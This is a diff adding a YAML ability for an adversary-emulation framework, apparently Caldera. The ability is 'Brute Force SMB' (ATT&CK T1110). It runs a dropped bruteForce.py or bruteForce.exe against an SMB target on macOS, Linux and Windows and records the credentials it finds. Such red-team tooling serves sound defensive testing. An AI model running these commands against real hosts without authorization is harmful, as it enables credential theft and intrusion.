@@ -1,0 +1,46 @@
+---
+
+- id: 405d7d46-cdb9-4c7f-97e9-7feba3bea2f6
+  name: Brute Force SMB
+  description: Use dropped file to brute force credentials
+  tactic: credential-access
+  technique:
+    attack_id: T1110
+    name: Brute Force
+  platforms:
+    darwin:
+      sh:
+        command: |
+          python3 ./bruteForce.py --target #{remote.service.smb}
+        payload: bruteForce.py
+        parser:
+          name: line
+          property: remote.host.credentials
+          script: ''
+    linux:
+      sh:
+        command: |
+          python3 ./bruteForce.py --target #{remote.service.smb}
+        payload: bruteForce.py
+        parser:
+          name: line
+          property: remote.host.credentials
+          script: ''
+    windows:
+      psh:
+        command: |
+          C:\Users\Public\bruteForce.exe --target #{remote.service.smb}
+        payload: bruteForce.exe
+        parser:
+          name: line
+          property: remote.host.credentials
+          script: ''
+      cmd:
+        command: |
+          C:\Users\Public\bruteForce.exe --target #{remote.service.smb}
+        payload: bruteForce.exe
+        parser:
+          name: line
+          property: remote.host.credentials
+          script: ''
+
